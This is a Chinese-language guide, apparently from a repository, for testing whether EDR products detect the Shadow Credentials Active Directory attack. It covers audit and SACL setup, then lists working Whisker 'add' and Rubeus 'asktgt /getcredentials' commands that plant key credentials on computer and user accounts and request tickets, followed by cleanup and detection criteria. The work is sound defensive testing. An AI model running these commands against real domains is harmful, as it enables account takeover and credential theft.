# Shadow Credentials EDR 完整驗證流程

## 概述
本指南提供完整、可重現的 Shadow Credentials EDR 驗證流程，讓第一次接觸的人也能按步驟完成測試。專注於驗證 EDR 對 Shadow Credentials 攻擊鏈的偵測能力，而非攻擊成功與否。

## ❓ 快速理解：什麼是 Shadow Credentials？
Shadow Credentials 是一種 AD 持久化/冒用技術：
- 攻擊者不是先偷密碼，而是把自己的公鑰憑證寫進目標帳號的 `msDS-KeyCredentialLink`
- 後續再用對應私鑰走 PKINIT，向 KDC 證明自己是該帳號
- 核心是「寫入 KeyCredential」，不是「一定要成功拿到 TGT」

### 為什麼這條命令本身就算執行了 Shadow Credentials？
```powershell
& "C:\Tools\Whisker\Whisker.exe" add /target:TARGET-COMPUTER$ /path:C:\Windows\Temp\shadow.pfx /password:"ComplexP@ssw0rd123!"
```
因為它完成了 Shadow Credentials 的植入階段：
- `/target:TARGET-COMPUTER$`：指定要被植入的 AD 物件（電腦帳號）
- `add`：產生 KeyCredential 並寫入 `msDS-KeyCredentialLink`
- `/path` + `/password`：輸出對應的 PFX（含私鑰），供後續 PKINIT 使用

一句話：`Whisker add` 是植入，`Rubeus asktgt /certificate ...` 是利用。

## 前置設定：讓 5136 正確產生

目標：在 DC 的 Security log 確實記錄 `msDS-KeyCredentialLink` 變更（Event ID 5136）。
關鍵原則：Advanced Audit 只是開事件來源；真正記錄哪些變更，要靠 SACL（Auditing）定義範圍。

### A. 在 DC 啟用 Directory Service Changes
```powershell
# 在目標 DC 上啟用並更新原則
Invoke-Command -ComputerName <DCName> -ScriptBlock {
  auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
  gpupdate /force
}

# 如採用 GPO，建議在 Default Domain Controllers Policy：
# Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration
# DS Access → Directory Service Changes：Success / Failure
# 並啟用：Audit: Force audit policy subcategory settings to override audit policy category settings
```

### B. 在 ADUC 設定 SACL（圖形介面，避免語法誤判）
1. 開啟 Active Directory Users and Computers，勾選 View → Advanced Features
2. 找到 `CN=Computers`（或承載目標帳號的 OU）
3. 右鍵 Properties → Security → Advanced → Auditing → Add
4. Principal：Everyone（或 Authenticated Users）
5. Type：Success（可加 Failure）
6. Applies to：This object and all descendant objects
7. Permissions：勾選「Write all properties」（或等效的 Write 欄位）
8. 套用後在 DC 執行 `gpupdate /force`

### C. 驗證 5136（使用 XML 欄位，避免語系訊息差異）
```powershell
$dc = "<DCName>"
$ev = Get-WinEvent -ComputerName $dc -FilterHashtable @{ LogName='Security'; Id=5136; StartTime=(Get-Date).AddHours(-2) }
foreach ($e in $ev) {
  $xml = [xml]$e.ToXml()
  $data = $xml.Event.EventData.Data
  $dn   = ($data | Where-Object {$_.Name -eq 'ObjectDN'}).'#text'
  $attr = ($data | Where-Object {$_.Name -eq 'AttributeLDAPDisplayName'}).'#text'
  if ($dn -like '*CN=TARGET-COMPUTER,CN=Computers,DC=domain,DC=local*' -and $attr -eq 'msDS-KeyCredentialLink') {
    [pscustomobject]@{ Time=$e.TimeCreated; DN=$dn; Attr=$attr }
  }
}
```

## 🎯 驗證目標
驗證 EDR 是否能偵測以下關鍵攻擊行為：
- ✅ AD 物件屬性修改 (`msDS-KeyCredentialLink`)
- ✅ 憑證檔案建立與讀取
- ✅ Whisker/Rubeus 工具執行
- ✅ Kerberos 憑證預驗證嘗試
- ❌ PKINIT 成功與否不影響驗證結果

## 📋 必要條件

### 環境要求
- Active Directory 環境 (Windows Server 2016+)
- 攻擊主機 (Windows 10/11)
- EDR 解決方案已部署

### 工具準備
```powershell
# 下載並準備工具
Whisker.exe -> C:\Tools\Whisker\Whisker.exe
Rubeus.exe -> C:\Tools\Rubeus\Rubeus.exe
```

## 🚀 完整驗證流程

### 階段一：環境準備
```powershell
# 1. 確認目標存在
Get-ADComputer -Identity "TARGET-COMPUTER$" | Select Name, DistinguishedName
Get-ADUser -Identity "TARGET-USER" | Select Name, DistinguishedName

# 2. 清理可能殘留 (可選)
& "C:\Tools\Whisker\Whisker.exe" list /target:TARGET-COMPUTER$
& "C:\Tools\Whisker\Whisker.exe" list /target:TARGET-USER
```

### 階段二：攻擊鏈執行 (核心驗證)
```powershell
# 3. 對電腦帳號執行 Shadow Credentials
& "C:\Tools\Whisker\Whisker.exe" add /target:TARGET-COMPUTER$ /path:C:\Windows\Temp\shadow.pfx /password:"ComplexP@ssw0rd123!"

# 4. 對使用者帳號執行 Shadow Credentials
& "C:\Tools\Whisker\Whisker.exe" add /target:TARGET-USER /path:C:\Windows\Temp\shadow_user.pfx /password:"ComplexP@ssw0rd123!"

# 5. 發起 PKINIT 認證嘗試 (即使預期被拒絕)
& "C:\Tools\Rubeus\Rubeus.exe" asktgt /user:TARGET-COMPUTER$ /certificate:C:\Windows\Temp\shadow.pfx /password:"ComplexP@ssw0rd123!" /domain:DOMAIN.LOCAL /dc:DC.DOMAIN.LOCAL /getcredentials /nowrap /enctype:AES256

& "C:\Tools\Rubeus\Rubeus.exe" asktgt /user:TARGET-USER /certificate:C:\Windows\Temp\shadow_user.pfx /password:"ComplexP@ssw0rd123!" /domain:DOMAIN.LOCAL /dc:DC.DOMAIN.LOCAL /getcredentials /nowrap /enctype:AES256
```

### 階段三：證據收集與驗證
```powershell
# 6. 確認 AD 屬性已修改
Get-ADComputer -Identity "TARGET-COMPUTER" -Properties msDS-KeyCredentialLink | Select -Expand msDS-KeyCredentialLink
Get-ADUser -Identity "TARGET-USER" -Properties msDS-KeyCredentialLink | Select -Expand msDS-KeyCredentialLink

# 7. 檢查 EDR 偵測結果 (根據具體 EDR 產品)
# - 尋找 AD 物件修改事件 (5136, 4662, 4742, 4738)
# - 尋找 Whisker.exe/Rubeus.exe 執行偵測
# - 尋找憑證檔案建立與讀取
# - 尋找 Kerberos 憑證預驗證嘗試
```

### 階段四：環境還原
```powershell
# 8. 取得當前 DeviceID
& "C:\Tools\Whisker\Whisker.exe" list /target:TARGET-COMPUTER$
& "C:\Tools\Whisker\Whisker.exe" list /target:TARGET-USER

# 9. 完整清理 AD 屬性
& "C:\Tools\Whisker\Whisker.exe" remove /target:TARGET-COMPUTER$ /deviceid:<DEVICE_ID>
& "C:\Tools\Whisker\Whisker.exe" remove /target:TARGET-USER /deviceid:<DEVICE_ID>

# 10. 刪除憑證檔案
Remove-Item C:\Windows\Temp\shadow.pfx -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\shadow_user.pfx -Force -ErrorAction SilentlyContinue

# 11. 最終確認清理完成
Get-ADComputer -Identity "TARGET-COMPUTER" -Properties msDS-KeyCredentialLink | Select -Expand msDS-KeyCredentialLink
Get-ADUser -Identity "TARGET-USER" -Properties msDS-KeyCredentialLink | Select -Expand msDS-KeyCredentialLink
```

## ✅ 驗證成功標準

### 必須偵測的項目
- **AD 物件修改偵測**：EDR 對 `msDS-KeyCredentialLink` 寫入產生告警
- **工具執行偵測**：EDR 對 Whisker/Rubeus 執行產生告警
- **檔案操作偵測**：EDR 對憑證檔案操作產生告警
- **網路活動偵測**：EDR 對 Kerberos 憑證預驗證嘗試產生告警

### 次要偵測項目 (加分項)
- 憑證內容分析偵測
- 橫向移動偵測
- 持久化機制偵測

## 🎯 EDR 偵測點詳細說明

### 1. AD 物件修改偵測 (高信號)
- **事件 ID**: 5136, 4662, 4742, 4738
- **屬性**: `msDS-KeyCredentialLink`
- **內容**: KeyCredential BLOB 資料

### 2. 工具執行偵測 (中信號)
- **程序**: Whisker.exe, Rubeus.exe
- **命令列**: 包含 `/certificate`, `/getcredentials` 參數
- **父程序**: 可能來自非標準路徑

### 3. 檔案操作偵測 (中信號)
- **檔案路徑**: `C:\Windows\Temp\shadow*.pfx`
- **操作類型**: 建立、讀取、寫入
- **檔案內容**: 包含憑證和私鑰資料

### 4. 網路活動偵測 (中信號)
- **通訊協定**: Kerberos (88/tcp)
- **內容**: PKINIT pa-data
- **結果**: KDC_ERR_PADATA_TYPE_NOSUPP (仍為有效偵測點)

## 🔧 技術要點說明

### 為什麼 KDC 拒絕仍算成功？
EDR 偵測的是「攻擊行為」而非「攻擊結果」。寫入 `msDS-KeyCredentialLink` 就是持久化證據，PKINIT 嘗試就是使用企圖。成功與否不影響偵測有效性。

### 最小必要步驟
寫入屬性 + 認證嘗試 = 完整攻擊鏈，無法再簡化。

### 可還原性
所有修改均可完全還原，確保測試環境潔淨。

### 覆蓋全面性
同時測試電腦帳號和使用者帳號，涵蓋不同物件類型。

## 📊 預期輸出範例

### 成功偵測範例
```
[EDR ALERT] Suspicious AD Object Modification
- Target: CN=TARGET-COMPUTER,CN=Computers,DC=domain,DC=local
- Attribute: msDS-KeyCredentialLink
- Tool: Whisker.exe
- Severity: High
```

### 攻擊鏈證據流
```
1. Whisker add → AD寫入 → EDR偵測
2. Rubeus asktgt → PKINIT嘗試 → EDR偵測
3. 憑證檔案操作 → EDR偵測
```

## 🚨 注意事項

1. **權限要求**: 需要對目標AD物件的寫入權限
2. **環境隔離**: 建議在測試環境執行
3. **還原確認**: 執行後務必確認環境完全還原
4. **EDR 配置**: 確保EDR監控功能正常啟用

## 📝 記錄與報告

### 建議記錄項目
- 執行時間戳記
- 使用的工具和參數
- AD物件修改前後狀態
- EDR告警內容和時間
- 環境還原確認

### 驗證報告範本
```markdown
# Shadow Credentials EDR 驗證報告

## 測試概述
- 日期: [日期]
- 環境: [環境描述]
- EDR產品: [產品名稱]

## 測試結果
- AD物件修改偵測: ✅/❌
- 工具執行偵測: ✅/❌
- 檔案操作偵測: ✅/❌
- 網路活動偵測: ✅/❌

## 詳細發現
[詳細偵測情況描述]

## 結論
[整體偵測能力評估]
```

## 🔗 相關資源

- [Microsoft Docs: msDS-KeyCredentialLink](https://learn.microsoft.com/windows/win32/adschema/a-msds-keycredentiallink)
- [MITRE ATT&CK: T1556.003](https://attack.mitre.org/techniques/T1556/003/)
- [Shadow Credentials 技術說明](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

## 📞 支援與回饋

如有問題或建議，請透過 GitHub Issues 提出。